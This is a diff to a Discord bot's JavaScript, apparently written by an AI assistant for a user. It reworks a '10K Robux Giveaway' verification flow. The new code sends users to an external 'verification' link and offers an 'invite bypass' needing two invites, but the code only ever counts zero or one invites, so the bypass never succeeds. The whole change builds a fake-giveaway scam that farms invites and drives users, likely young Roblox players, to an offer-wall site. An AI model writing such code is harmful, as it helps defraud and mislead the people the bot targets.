@@ -305,25 +305,25 @@ async function handleButtonInteraction(interaction) {
             
             // Create welcome embed for private thread
             const welcomeEmbed = new EmbedBuilder()
-                .setTitle('🎁 10K Robux Giveaway Verification')
-                .setDescription(`Welcome ${interaction.member}! You're in your **private verification area** for the 10,000 Robux giveaway.\n\n🔒 **This thread is private** - only you and authorized staff can see this.\n\n📋 **Next Steps:**\n▶️ Click **Complete Verification** below\n▶️ Follow the verification process\n▶️ Get your **10K Robux** delivered!`)
+                .setTitle(`You're almost there!`)
+                .setDescription(`# **To Get Access To The Giveaway:**\n\n> **1.** Go to This Website & Select Your Prize!\n> **2.** Enter your Username & click on continue.\n> **3.** Once done confirming complete ANY TWO steps given below!\n\nOnce done, you will get access to the Reward Giveaway\n\n**NOTE:**\nIssues completing the Verification? Get 2 Invites to bypass the Verification!`)
                 .setColor(0x5865F2)
                 .setTimestamp();
             
-            // Create verification button
+            // Create verification and bypass buttons
             const verifyButton = new ButtonBuilder()
-                .setCustomId(`verify_claim_${interaction.user.id}`)
-                .setLabel('Complete Verification')
-                .setStyle(ButtonStyle.Success)
-                .setEmoji('✅');
+                .setCustomId(`start_verification_${interaction.user.id}`)
+                .setLabel('Start Verification')
+                .setStyle(ButtonStyle.Primary)
+                .setEmoji('🔗');
             
-            const cancelButton = new ButtonBuilder()
-                .setCustomId(`cancel_claim_${interaction.user.id}`)
-                .setLabel('Cancel Claim')
-                .setStyle(ButtonStyle.Danger)
-                .setEmoji('❌');
+            const bypassButton = new ButtonBuilder()
+                .setCustomId(`check_bypass_${interaction.user.id}`)
+                .setLabel('Check Invite Bypass')
+                .setStyle(ButtonStyle.Secondary)
+                .setEmoji('⚡');
             
-            const verifyRow = new ActionRowBuilder().addComponents(verifyButton, cancelButton);
+            const verifyRow = new ActionRowBuilder().addComponents(verifyButton, bypassButton);
             
             await thread.send({ embeds: [welcomeEmbed], components: [verifyRow] });
             
@@ -368,6 +368,79 @@ async function handleButtonInteraction(interaction) {
         });
         
         console.log(`Invite check performed by ${interaction.user.tag}: ${inviteCount} invite(s)`);
+    }
+    
+    else if (customId.startsWith('start_verification_')) {
+        const userId = customId.split('_')[2];
+        
+        if (interaction.user.id !== userId) {
+            return await interaction.reply({
+                content: '❌ Only the reward claimer can start verification.',
+                flags: [4096]
+            });
+        }
+        
+        // Send verification link
+        const verificationEmbed = new EmbedBuilder()
+            .setTitle('🔗 Verification Required')
+            .setDescription('Click the link below to start your verification process:\n\n**[Start Verification Process](https://free-content.pro/s?SGMoBfwM)**\n\nOnce you complete the verification, you will automatically get access to the reward giveaway!')
+            .setColor(0x5865F2)
+            .setTimestamp();
+        
+        await interaction.reply({
+            embeds: [verificationEmbed],
+            flags: [4096]
+        });
+        
+        console.log(`Verification link sent to ${interaction.user.tag}`);
+    }
+    
+    else if (customId.startsWith('check_bypass_')) {
+        const userId = customId.split('_')[2];
+        
+        if (interaction.user.id !== userId) {
+            return await interaction.reply({
+                content: '❌ Only the reward claimer can check bypass eligibility.',
+                flags: [4096]
+            });
+        }
+        
+        // Check if user has enough invites to bypass (currently checking for 1 invite, you mentioned you'll change to 2 later)
+        const hasInviteRole = hasRequiredRole(interaction.member);
+        const inviteCount = hasInviteRole ? 1 : 0;
+        const requiredInvites = 2; // This is what you mentioned you'll change to
+        
+        const bypassEmbed = new EmbedBuilder()
+            .setTitle('⚡ Invite Bypass Check')
+            .setColor(inviteCount >= requiredInvites ? 0x00FF00 : 0xFF6B6B);
+        
+        if (inviteCount >= requiredInvites) {
+            bypassEmbed.setDescription(`✅ **Bypass Available!**\n\nYou have **${inviteCount}** invites and can bypass verification!\n\nYou now have access to the reward giveaway without completing verification.`);
+            
+            // Create final claim button for bypass users
+            const bypassClaimButton = new ButtonBuilder()
+                .setCustomId(`final_claim_${interaction.user.id}`)
+                .setLabel('Claim My Reward')
+                .setStyle(ButtonStyle.Success)
+                .setEmoji('🏆');
+            
+            const bypassRow = new ActionRowBuilder().addComponents(bypassClaimButton);
+            
+            await interaction.reply({
+                embeds: [bypassEmbed],
+                components: [bypassRow],
+                flags: [4096]
+            });
+        } else {
+            bypassEmbed.setDescription(`❌ **Bypass Not Available**\n\nYou have **${inviteCount}** invites but need **${requiredInvites}** invites to bypass verification.\n\nPlease complete the verification process or get more invites.`);
+            
+            await interaction.reply({
+                embeds: [bypassEmbed],
+                flags: [4096]
+            });
+        }
+        
+        console.log(`Bypass check performed by ${interaction.user.tag}: ${inviteCount}/${requiredInvites} invites`);
     }
     
     else if (customId.startsWith('verify_claim_')) {
